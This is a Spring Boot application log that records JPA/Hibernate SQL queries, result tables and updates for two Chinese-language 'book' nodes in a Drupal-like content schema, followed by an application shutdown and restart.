|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|1         |book   |0     |283828550600385  |zh-hans  |1           |
|----------|-------|------|-----------------|---------|------------|

2020-11-19 10:54:55.988 INFO  jdbc.sqltiming Line:373 - select nodeentity0_.nid as nid1_2_, nodeentity0_.langcode as langcode2_2_, nodeentity0_.type 
as type3_2_, nodeentity0_.uuid as uuid4_2_, nodeentity0_.vid as vid5_2_ from node nodeentity0_ 
where nodeentity0_.nid=1 
 {executed in 1 msec}
2020-11-19 10:54:55.988 INFO  jdbc.resultsettable Line:610 - 
|----|---------|-----|-------------------------------------|----|
|nid |langcode |type |uuid                                 |vid |
|----|---------|-----|-------------------------------------|----|
|1   |zh-hans  |book |4bb8e624-5f97-4aae-b6e2-3b2e1b596579 |1   |
|----|---------|-----|-------------------------------------|----|

2020-11-19 10:54:55.991 INFO  jdbc.sqltiming Line:373 - select nodefieldf0_.entity_id as entity_i1_15_0_, nodefieldf0_.bundle as bundle2_15_0_, nodefieldf0_.delta 
as delta3_15_0_, nodefieldf0_.field_fsid_value as field_fs4_15_0_, nodefieldf0_.langcode as 
langcode5_15_0_, nodefieldf0_.revision_id as revision6_15_0_ from node_revision__field_fsid 
nodefieldf0_ where nodefieldf0_.entity_id=1 
 {executed in 0 msec}
2020-11-19 10:54:55.991 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|[unread]  |book   |0     |283828550600385  |zh-hans  |1           |
|----------|-------|------|-----------------|---------|------------|

2020-11-19 10:54:55.993 INFO  jdbc.sqltiming Line:373 - select bookentity0_.nid as nid1_1_, bookentity0_.bid as bid2_1_, bookentity0_.depth as depth3_1_, 
bookentity0_.has_children as has_chil4_1_, bookentity0_.p1 as p5_1_, bookentity0_.p2 as p6_1_, 
bookentity0_.p3 as p7_1_, bookentity0_.p4 as p8_1_, bookentity0_.p5 as p9_1_, bookentity0_.pid 
as pid10_1_, bookentity0_.weight as weight11_1_ from book bookentity0_ where bookentity0_.nid=1 
 {executed in 1 msec}
2020-11-19 10:54:55.994 INFO  jdbc.resultsettable Line:610 - 
|----|----|------|-------------|---|---|---|---|---|----|-------|
|nid |bid |depth |has_children |p1 |p2 |p3 |p4 |p5 |pid |weight |
|----|----|------|-------------|---|---|---|---|---|----|-------|
|1   |1   |1     |1            |1  |0  |0  |0  |0  |0   |0      |
|----|----|------|-------------|---|---|---|---|---|----|-------|

2020-11-19 10:54:55.996 INFO  jdbc.sqltiming Line:373 - select nodebodyen0_.entity_id as entity_i1_3_, nodebodyen0_.body_value as body_val2_3_, nodebodyen0_.body_summary 
as body_sum3_3_, nodebodyen0_.bundle as bundle4_3_, nodebodyen0_.delta as delta5_3_, nodebodyen0_.body_format 
as body_for6_3_, nodebodyen0_.langcode as langcode7_3_, nodebodyen0_.revision_id as revision8_3_ 
from node__body nodebodyen0_ where nodebodyen0_.entity_id=1 
 {executed in 0 msec}
2020-11-19 10:54:55.997 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|1         |           |             |book   |0     |full_html   |zh-hans  |1           |
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 10:54:55.998 INFO  jdbc.sqltiming Line:373 - select nodebodyre0_.entity_id as entity_i1_12_0_, nodebodyre0_.body_value as body_val2_12_0_, 
nodebodyre0_.body_summary as body_sum3_12_0_, nodebodyre0_.bundle as bundle4_12_0_, nodebodyre0_.delta 
as delta5_12_0_, nodebodyre0_.body_format as body_for6_12_0_, nodebodyre0_.langcode as langcode7_12_0_, 
nodebodyre0_.revision_id as revision8_12_0_ from node_revision__body nodebodyre0_ where nodebodyre0_.entity_id=1 
 {executed in 0 msec}
2020-11-19 10:54:55.998 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|[unread]  |           |             |book   |0     |full_html   |zh-hans  |1           |
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 10:54:56.000 INFO  jdbc.sqltiming Line:373 - select nodefiledd0_.nid as nid1_9_, nodefiledd0_.changed as changed2_9_, nodefiledd0_.created 
as created3_9_, nodefiledd0_.default_langcode as default_4_9_, nodefiledd0_.langcode as langcode5_9_, 
nodefiledd0_.promote as promote6_9_, nodefiledd0_.revision_translation_affected as revision7_9_, 
nodefiledd0_.status as status8_9_, nodefiledd0_.sticky as sticky9_9_, nodefiledd0_.title as 
title10_9_, nodefiledd0_.type as type11_9_, nodefiledd0_.uid as uid12_9_, nodefiledd0_.vid 
as vid13_9_ from node_field_data nodefiledd0_ where nodefiledd0_.nid=1 
 {executed in 0 msec}
2020-11-19 10:54:56.001 INFO  jdbc.resultsettable Line:610 - 
|----|-----------|-----------|-----------------|---------|--------|------------------------------|-------|-------|-------------|-----|----|----|
|nid |changed    |created    |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title        |type |uid |vid |
|----|-----------|-----------|-----------------|---------|--------|------------------------------|-------|-------|-------------|-----|----|----|
|1   |1605754427 |1605754427 |1                |zh-hans  |0       |1                             |1      |0      |87-全栈工程师修炼指南 |book |1   |1   |
|----|-----------|-----------|-----------------|---------|--------|------------------------------|-------|-------|-------------|-----|----|----|

2020-11-19 10:54:56.002 INFO  jdbc.sqltiming Line:373 - select nodefieldr0_.nid as nid1_10_0_, nodefieldr0_.changed as changed2_10_0_, nodefieldr0_.created 
as created3_10_0_, nodefieldr0_.default_langcode as default_4_10_0_, nodefieldr0_.langcode 
as langcode5_10_0_, nodefieldr0_.promote as promote6_10_0_, nodefieldr0_.revision_translation_affected 
as revision7_10_0_, nodefieldr0_.status as status8_10_0_, nodefieldr0_.sticky as sticky9_10_0_, 
nodefieldr0_.title as title10_10_0_, nodefieldr0_.uid as uid11_10_0_, nodefieldr0_.vid as vid12_10_0_ 
from node_field_revision nodefieldr0_ where nodefieldr0_.nid=1 
 {executed in 0 msec}
2020-11-19 10:54:56.003 INFO  jdbc.resultsettable Line:610 - 
|---------|-----------|-----------|-----------------|---------|--------|------------------------------|-------|-------|-------------|----|----|
|nid      |changed    |created    |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title        |uid |vid |
|---------|-----------|-----------|-----------------|---------|--------|------------------------------|-------|-------|-------------|----|----|
|[unread] |1605754427 |1605754427 |1                |zh-hans  |0       |1                             |1      |0      |87-全栈工程师修炼指南 |1   |1   |
|---------|-----------|-----------|-----------------|---------|--------|------------------------------|-------|-------|-------------|----|----|

2020-11-19 10:54:56.004 INFO  jdbc.sqltiming Line:373 - update node_field_data set changed=1605754496, created=1605754496, default_langcode=1, langcode='zh-hans', 
promote=0, revision_translation_affected=1, status=1, sticky=0, title='87-全栈工程师修炼指南', type='book', 
uid=1, vid=1 where nid=1 
 {executed in 0 msec}
2020-11-19 10:54:56.005 INFO  jdbc.sqltiming Line:373 - update node_field_revision set changed=1605754496, created=1605754496, default_langcode=1, 
langcode='zh-hans', promote=0, revision_translation_affected=1, status=1, sticky=0, title='87-全栈工程师修炼指南', 
uid=1, vid=1 where nid=1 
 {executed in 0 msec}
2020-11-19 10:54:56.013 INFO  jdbc.sqltiming Line:373 - select bookfieldm0_.entity_id as entity_i1_7_, bookfieldm0_.bundle as bundle2_7_, bookfieldm0_.delta 
as delta3_7_, bookfieldm0_.langcode as langcode4_7_, bookfieldm0_.field_media_value as field_me5_7_, 
bookfieldm0_.revision_id as revision6_7_ from node__field_media bookfieldm0_ where bookfieldm0_.entity_id=1 
 {executed in 0 msec}
2020-11-19 10:54:56.014 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|1         |book   |0     |zh-hans  |                  |1           |
|----------|-------|------|---------|------------------|------------|

2020-11-19 10:54:56.015 INFO  jdbc.sqltiming Line:373 - select nodefieldm0_.entity_id as entity_i1_16_0_, nodefieldm0_.bundle as bundle2_16_0_, nodefieldm0_.delta 
as delta3_16_0_, nodefieldm0_.langcode as langcode4_16_0_, nodefieldm0_.field_media_value as 
field_me5_16_0_, nodefieldm0_.revision_id as revision6_16_0_ from node_revision__field_media 
nodefieldm0_ where nodefieldm0_.entity_id=1 
 {executed in 0 msec}
2020-11-19 10:54:56.016 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|[unread]  |book   |0     |zh-hans  |                  |1           |
|----------|-------|------|---------|------------------|------------|

2020-11-19 10:54:56.017 INFO  jdbc.sqltiming Line:373 - select bookfieldc0_.entity_id as entity_i1_4_, bookfieldc0_.bundle as bundle2_4_, bookfieldc0_.field_comment_value 
as field_co3_4_, bookfieldc0_.delta as delta4_4_, bookfieldc0_.field_comment_format as field_co5_4_, 
bookfieldc0_.langcode as langcode6_4_, bookfieldc0_.revision_id as revision7_4_ from node__field_comment 
bookfieldc0_ where bookfieldc0_.entity_id=1 
 {executed in 0 msec}
2020-11-19 10:54:56.018 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|1         |book   |                    |0     |full_html            |zh-hans  |1           |
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 10:54:56.019 INFO  jdbc.sqltiming Line:373 - select nodefieldc0_.entity_id as entity_i1_13_0_, nodefieldc0_.bundle as bundle2_13_0_, nodefieldc0_.field_comment_value 
as field_co3_13_0_, nodefieldc0_.delta as delta4_13_0_, nodefieldc0_.field_comment_format as 
field_co5_13_0_, nodefieldc0_.langcode as langcode6_13_0_, nodefieldc0_.revision_id as revision7_13_0_ 
from node_revision__field_comment nodefieldc0_ where nodefieldc0_.entity_id=1 
 {executed in 0 msec}
2020-11-19 10:54:56.020 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|[unread]  |book   |                    |0     |full_html            |zh-hans  |1           |
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 10:54:56.021 INFO  jdbc.sqltiming Line:373 - select bookfieldt0_.entity_id as entity_i1_8_, bookfieldt0_.bundle as bundle2_8_, bookfieldt0_.delta 
as delta3_8_, bookfieldt0_.langcode as langcode4_8_, bookfieldt0_.revision_id as revision5_8_, 
bookfieldt0_.field_thumb_value as field_th6_8_ from node__field_thumb bookfieldt0_ where bookfieldt0_.entity_id=1 
 {executed in 0 msec}
2020-11-19 10:54:56.022 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|1         |book   |0     |zh-hans  |1           |                  |
|----------|-------|------|---------|------------|------------------|

2020-11-19 10:54:56.025 INFO  jdbc.sqltiming Line:373 - select nodefieldt0_.entity_id as entity_i1_17_0_, nodefieldt0_.bundle as bundle2_17_0_, nodefieldt0_.delta 
as delta3_17_0_, nodefieldt0_.langcode as langcode4_17_0_, nodefieldt0_.revision_id as revision5_17_0_, 
nodefieldt0_.field_thumb_value as field_th6_17_0_ from node_revision__field_thumb nodefieldt0_ 
where nodefieldt0_.entity_id=1 
 {executed in 1 msec}
2020-11-19 10:54:56.025 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|[unread]  |book   |0     |zh-hans  |1           |                  |
|----------|-------|------|---------|------------|------------------|

2020-11-19 10:54:56.027 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_5_0_, bookfieldf0_.bundle as bundle2_5_0_, bookfieldf0_.delta 
as delta3_5_0_, bookfieldf0_.field_fenlei_target_id as field_fe4_5_0_, bookfieldf0_.langcode 
as langcode5_5_0_, bookfieldf0_.revision_id as revision6_5_0_ from node__field_fenlei bookfieldf0_ 
where bookfieldf0_.entity_id=1 
 {executed in 0 msec}
2020-11-19 10:54:56.028 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------------|---------|------------|
|entity_id |bundle |delta |field_fenlei_target_id |langcode |revision_id |
|----------|-------|------|-----------------------|---------|------------|
|[unread]  |book   |0     |1                      |zh-hans  |1           |
|----------|-------|------|-----------------------|---------|------------|

2020-11-19 10:54:56.030 INFO  jdbc.sqltiming Line:373 - select nodefieldf0_.entity_id as entity_i1_14_0_, nodefieldf0_.bundle as bundle2_14_0_, nodefieldf0_.delta 
as delta3_14_0_, nodefieldf0_.field_fenlei_target_id as field_fe4_14_0_, nodefieldf0_.langcode 
as langcode5_14_0_, nodefieldf0_.revision_id as revision6_14_0_ from node_revision__field_fenlei 
nodefieldf0_ where nodefieldf0_.entity_id=1 
 {executed in 1 msec}
2020-11-19 10:54:56.030 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------------|---------|------------|
|entity_id |bundle |delta |field_fenlei_target_id |langcode |revision_id |
|----------|-------|------|-----------------------|---------|------------|
|[unread]  |book   |0     |1                      |zh-hans  |1           |
|----------|-------|------|-----------------------|---------|------------|

2020-11-19 10:54:56.743 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_6_, bookfieldf0_.bundle as bundle2_6_, bookfieldf0_.delta 
as delta3_6_, bookfieldf0_.field_fsid_value as field_fs4_6_, bookfieldf0_.langcode as langcode5_6_, 
bookfieldf0_.revision_id as revision6_6_ from node__field_fsid bookfieldf0_ where bookfieldf0_.field_fsid_value='568347143558516' 
 {executed in 1 msec}
2020-11-19 10:54:56.744 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|2         |book   |0     |568347143558516  |zh-hans  |2           |
|----------|-------|------|-----------------|---------|------------|

2020-11-19 10:54:56.747 INFO  jdbc.sqltiming Line:373 - select nodeentity0_.nid as nid1_2_, nodeentity0_.langcode as langcode2_2_, nodeentity0_.type 
as type3_2_, nodeentity0_.uuid as uuid4_2_, nodeentity0_.vid as vid5_2_ from node nodeentity0_ 
where nodeentity0_.nid=2 
 {executed in 1 msec}
2020-11-19 10:54:56.748 INFO  jdbc.resultsettable Line:610 - 
|----|---------|-----|-------------------------------------|----|
|nid |langcode |type |uuid                                 |vid |
|----|---------|-----|-------------------------------------|----|
|2   |zh-hans  |book |d915ec1c-b08c-4c6a-ae15-dd21d3de8ea1 |2   |
|----|---------|-----|-------------------------------------|----|

2020-11-19 10:54:56.751 INFO  jdbc.sqltiming Line:373 - select nodefieldf0_.entity_id as entity_i1_15_0_, nodefieldf0_.bundle as bundle2_15_0_, nodefieldf0_.delta 
as delta3_15_0_, nodefieldf0_.field_fsid_value as field_fs4_15_0_, nodefieldf0_.langcode as 
langcode5_15_0_, nodefieldf0_.revision_id as revision6_15_0_ from node_revision__field_fsid 
nodefieldf0_ where nodefieldf0_.entity_id=2 
 {executed in 1 msec}
2020-11-19 10:54:56.752 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|[unread]  |book   |0     |568347143558516  |zh-hans  |2           |
|----------|-------|------|-----------------|---------|------------|

2020-11-19 10:54:56.754 INFO  jdbc.sqltiming Line:373 - select bookentity0_.nid as nid1_1_, bookentity0_.bid as bid2_1_, bookentity0_.depth as depth3_1_, 
bookentity0_.has_children as has_chil4_1_, bookentity0_.p1 as p5_1_, bookentity0_.p2 as p6_1_, 
bookentity0_.p3 as p7_1_, bookentity0_.p4 as p8_1_, bookentity0_.p5 as p9_1_, bookentity0_.pid 
as pid10_1_, bookentity0_.weight as weight11_1_ from book bookentity0_ where bookentity0_.nid=2 
 {executed in 0 msec}
2020-11-19 10:54:56.755 INFO  jdbc.resultsettable Line:610 - 
|----|----|------|-------------|---|---|---|---|---|----|-------|
|nid |bid |depth |has_children |p1 |p2 |p3 |p4 |p5 |pid |weight |
|----|----|------|-------------|---|---|---|---|---|----|-------|
|2   |1   |2     |1            |1  |2  |0  |0  |0  |1   |0      |
|----|----|------|-------------|---|---|---|---|---|----|-------|

2020-11-19 10:54:56.760 INFO  jdbc.sqltiming Line:373 - select nodebodyen0_.entity_id as entity_i1_3_, nodebodyen0_.body_value as body_val2_3_, nodebodyen0_.body_summary 
as body_sum3_3_, nodebodyen0_.bundle as bundle4_3_, nodebodyen0_.delta as delta5_3_, nodebodyen0_.body_format 
as body_for6_3_, nodebodyen0_.langcode as langcode7_3_, nodebodyen0_.revision_id as revision8_3_ 
from node__body nodebodyen0_ where nodebodyen0_.entity_id=2 
 {executed in 1 msec}
2020-11-19 10:54:56.761 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|2         |           |             |book   |0     |full_html   |zh-hans  |2           |
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 10:54:56.764 INFO  jdbc.sqltiming Line:373 - select nodebodyre0_.entity_id as entity_i1_12_0_, nodebodyre0_.body_value as body_val2_12_0_, 
nodebodyre0_.body_summary as body_sum3_12_0_, nodebodyre0_.bundle as bundle4_12_0_, nodebodyre0_.delta 
as delta5_12_0_, nodebodyre0_.body_format as body_for6_12_0_, nodebodyre0_.langcode as langcode7_12_0_, 
nodebodyre0_.revision_id as revision8_12_0_ from node_revision__body nodebodyre0_ where nodebodyre0_.entity_id=2 
 {executed in 1 msec}
2020-11-19 10:54:56.765 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|[unread]  |           |             |book   |0     |full_html   |zh-hans  |2           |
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 10:54:56.768 INFO  jdbc.sqltiming Line:373 - select nodefiledd0_.nid as nid1_9_, nodefiledd0_.changed as changed2_9_, nodefiledd0_.created 
as created3_9_, nodefiledd0_.default_langcode as default_4_9_, nodefiledd0_.langcode as langcode5_9_, 
nodefiledd0_.promote as promote6_9_, nodefiledd0_.revision_translation_affected as revision7_9_, 
nodefiledd0_.status as status8_9_, nodefiledd0_.sticky as sticky9_9_, nodefiledd0_.title as 
title10_9_, nodefiledd0_.type as type11_9_, nodefiledd0_.uid as uid12_9_, nodefiledd0_.vid 
as vid13_9_ from node_field_data nodefiledd0_ where nodefiledd0_.nid=2 
 {executed in 1 msec}
2020-11-19 10:54:56.769 INFO  jdbc.resultsettable Line:610 - 
|----|-----------|-----------|-----------------|---------|--------|------------------------------|-------|-------|-------------|-----|----|----|
|nid |changed    |created    |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title        |type |uid |vid |
|----|-----------|-----------|-----------------|---------|--------|------------------------------|-------|-------|-------------|-----|----|----|
|2   |1605754428 |1605754428 |1                |zh-hans  |0       |1                             |1      |0      |07丨全栈回顾 (1讲) |book |1   |2   |
|----|-----------|-----------|-----------------|---------|--------|------------------------------|-------|-------|-------------|-----|----|----|

2020-11-19 10:54:56.770 INFO  jdbc.sqltiming Line:373 - select nodefieldr0_.nid as nid1_10_0_, nodefieldr0_.changed as changed2_10_0_, nodefieldr0_.created 
as created3_10_0_, nodefieldr0_.default_langcode as default_4_10_0_, nodefieldr0_.langcode 
as langcode5_10_0_, nodefieldr0_.promote as promote6_10_0_, nodefieldr0_.revision_translation_affected 
as revision7_10_0_, nodefieldr0_.status as status8_10_0_, nodefieldr0_.sticky as sticky9_10_0_, 
nodefieldr0_.title as title10_10_0_, nodefieldr0_.uid as uid11_10_0_, nodefieldr0_.vid as vid12_10_0_ 
from node_field_revision nodefieldr0_ where nodefieldr0_.nid=2 
 {executed in 0 msec}
2020-11-19 10:54:56.771 INFO  jdbc.resultsettable Line:610 - 
|---------|-----------|-----------|-----------------|---------|--------|------------------------------|-------|-------|-------------|----|----|
|nid      |changed    |created    |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title        |uid |vid |
|---------|-----------|-----------|-----------------|---------|--------|------------------------------|-------|-------|-------------|----|----|
|[unread] |1605754428 |1605754428 |1                |zh-hans  |0       |1                             |1      |0      |07丨全栈回顾 (1讲) |1   |2   |
|---------|-----------|-----------|-----------------|---------|--------|------------------------------|-------|-------|-------------|----|----|

2020-11-19 10:54:56.773 INFO  jdbc.sqltiming Line:373 - update node_field_data set changed=1605754496, created=1605754496, default_langcode=1, langcode='zh-hans', 
promote=0, revision_translation_affected=1, status=1, sticky=0, title='07丨全栈回顾 (1讲)', type='book', 
uid=1, vid=2 where nid=2 
 {executed in 1 msec}
2020-11-19 10:54:56.774 INFO  jdbc.sqltiming Line:373 - update node_field_revision set changed=1605754496, created=1605754496, default_langcode=1, 
langcode='zh-hans', promote=0, revision_translation_affected=1, status=1, sticky=0, title='07丨全栈回顾 
(1讲)', uid=1, vid=2 where nid=2 
 {executed in 1 msec}
2020-11-19 10:54:56.780 INFO  jdbc.sqltiming Line:373 - select bookfieldm0_.entity_id as entity_i1_7_, bookfieldm0_.bundle as bundle2_7_, bookfieldm0_.delta 
as delta3_7_, bookfieldm0_.langcode as langcode4_7_, bookfieldm0_.field_media_value as field_me5_7_, 
bookfieldm0_.revision_id as revision6_7_ from node__field_media bookfieldm0_ where bookfieldm0_.entity_id=2 
 {executed in 0 msec}
2020-11-19 10:54:56.781 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|2         |book   |0     |zh-hans  |                  |2           |
|----------|-------|------|---------|------------------|------------|

2020-11-19 10:54:56.782 INFO  jdbc.sqltiming Line:373 - select nodefieldm0_.entity_id as entity_i1_16_0_, nodefieldm0_.bundle as bundle2_16_0_, nodefieldm0_.delta 
as delta3_16_0_, nodefieldm0_.langcode as langcode4_16_0_, nodefieldm0_.field_media_value as 
field_me5_16_0_, nodefieldm0_.revision_id as revision6_16_0_ from node_revision__field_media 
nodefieldm0_ where nodefieldm0_.entity_id=2 
 {executed in 0 msec}
2020-11-19 10:54:56.783 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|[unread]  |book   |0     |zh-hans  |                  |2           |
|----------|-------|------|---------|------------------|------------|

2020-11-19 10:54:56.785 INFO  jdbc.sqltiming Line:373 - select bookfieldc0_.entity_id as entity_i1_4_, bookfieldc0_.bundle as bundle2_4_, bookfieldc0_.field_comment_value 
as field_co3_4_, bookfieldc0_.delta as delta4_4_, bookfieldc0_.field_comment_format as field_co5_4_, 
bookfieldc0_.langcode as langcode6_4_, bookfieldc0_.revision_id as revision7_4_ from node__field_comment 
bookfieldc0_ where bookfieldc0_.entity_id=2 
 {executed in 1 msec}
2020-11-19 10:54:56.785 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|2         |book   |                    |0     |full_html            |zh-hans  |2           |
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 10:54:56.787 INFO  jdbc.sqltiming Line:373 - select nodefieldc0_.entity_id as entity_i1_13_0_, nodefieldc0_.bundle as bundle2_13_0_, nodefieldc0_.field_comment_value 
as field_co3_13_0_, nodefieldc0_.delta as delta4_13_0_, nodefieldc0_.field_comment_format as 
field_co5_13_0_, nodefieldc0_.langcode as langcode6_13_0_, nodefieldc0_.revision_id as revision7_13_0_ 
from node_revision__field_comment nodefieldc0_ where nodefieldc0_.entity_id=2 
 {executed in 0 msec}
2020-11-19 10:54:56.787 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|[unread]  |book   |                    |0     |full_html            |zh-hans  |2           |
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 10:54:56.788 INFO  jdbc.sqltiming Line:373 - select bookfieldt0_.entity_id as entity_i1_8_, bookfieldt0_.bundle as bundle2_8_, bookfieldt0_.delta 
as delta3_8_, bookfieldt0_.langcode as langcode4_8_, bookfieldt0_.revision_id as revision5_8_, 
bookfieldt0_.field_thumb_value as field_th6_8_ from node__field_thumb bookfieldt0_ where bookfieldt0_.entity_id=2 
 {executed in 0 msec}
2020-11-19 10:54:56.789 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|2         |book   |0     |zh-hans  |2           |                  |
|----------|-------|------|---------|------------|------------------|

2020-11-19 10:54:56.791 INFO  jdbc.sqltiming Line:373 - select nodefieldt0_.entity_id as entity_i1_17_0_, nodefieldt0_.bundle as bundle2_17_0_, nodefieldt0_.delta 
as delta3_17_0_, nodefieldt0_.langcode as langcode4_17_0_, nodefieldt0_.revision_id as revision5_17_0_, 
nodefieldt0_.field_thumb_value as field_th6_17_0_ from node_revision__field_thumb nodefieldt0_ 
where nodefieldt0_.entity_id=2 
 {executed in 0 msec}
2020-11-19 10:54:56.792 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|[unread]  |book   |0     |zh-hans  |2           |                  |
|----------|-------|------|---------|------------|------------------|

2020-11-19 10:54:56.793 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_5_0_, bookfieldf0_.bundle as bundle2_5_0_, bookfieldf0_.delta 
as delta3_5_0_, bookfieldf0_.field_fenlei_target_id as field_fe4_5_0_, bookfieldf0_.langcode 
as langcode5_5_0_, bookfieldf0_.revision_id as revision6_5_0_ from node__field_fenlei bookfieldf0_ 
where bookfieldf0_.entity_id=2 
 {executed in 0 msec}
2020-11-19 10:54:56.794 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------------|---------|------------|
|entity_id |bundle |delta |field_fenlei_target_id |langcode |revision_id |
|----------|-------|------|-----------------------|---------|------------|
|[unread]  |book   |0     |1                      |zh-hans  |2           |
|----------|-------|------|-----------------------|---------|------------|

2020-11-19 10:54:56.796 INFO  jdbc.sqltiming Line:373 - select nodefieldf0_.entity_id as entity_i1_14_0_, nodefieldf0_.bundle as bundle2_14_0_, nodefieldf0_.delta 
as delta3_14_0_, nodefieldf0_.field_fenlei_target_id as field_fe4_14_0_, nodefieldf0_.langcode 
as langcode5_14_0_, nodefieldf0_.revision_id as revision6_14_0_ from node_revision__field_fenlei 
nodefieldf0_ where nodefieldf0_.entity_id=2 
 {executed in 0 msec}
2020-11-19 10:54:56.797 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------------|---------|------------|
|entity_id |bundle |delta |field_fenlei_target_id |langcode |revision_id |
|----------|-------|------|-----------------------|---------|------------|
|[unread]  |book   |0     |1                      |zh-hans  |2           |
|----------|-------|------|-----------------------|---------|------------|

2020-11-19 10:55:17.122 INFO  org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean Line:598 - Closing JPA EntityManagerFactory for persistence unit 'default'
2020-11-19 10:55:17.123 INFO  org.springframework.scheduling.concurrent.ThreadPoolTaskExecutor Line:218 - Shutting down ExecutorService 'applicationTaskExecutor'
2020-11-19 10:55:17.124 INFO  com.zaxxer.hikari.HikariDataSource Line:350 - HikariPool-1 - Shutdown initiated...
2020-11-19 10:55:17.129 INFO  com.zaxxer.hikari.HikariDataSource Line:352 - HikariPool-1 - Shutdown completed.
2020-11-19 10:55:24.435 INFO  geek.me.javaapi.JavaApiApplication Line:651 - No active profile set, falling back to default profiles: default
2020-11-19 10:55:24.793 INFO  org.springframework.data.repository.config.RepositoryConfigurationDelegate Line:127 - Bootstrapping Spring Data JPA repositories in DEFERRED mode.
2020-11-19 10:55:24.876 INFO  org.springframework.data.repository.config.RepositoryConfigurationDelegate Line:187 - Finished Spring Data repository scanning in 77ms. Found 19 JPA repository interfaces.
2020-11-19 10:55:25.005 INFO  org.springframework.cloud.context.scope.GenericScope Line:295 - BeanFactory id=712cf88e-c083-3907-88de-02f90b8f246d
2020-11-19 10:55:25.269 INFO  org.springframework.boot.web.embedded.tomcat.TomcatWebServer Line:108 - Tomcat initialized with port(s): 8080 (http)
2020-11-19 10:55:25.276 INFO  org.apache.coyote.http11.Http11NioProtocol Line:173 - Initializing ProtocolHandler ["http-nio-8080"]
2020-11-19 10:55:25.276 INFO  org.apache.catalina.core.StandardService Line:173 - Starting service [Tomcat]
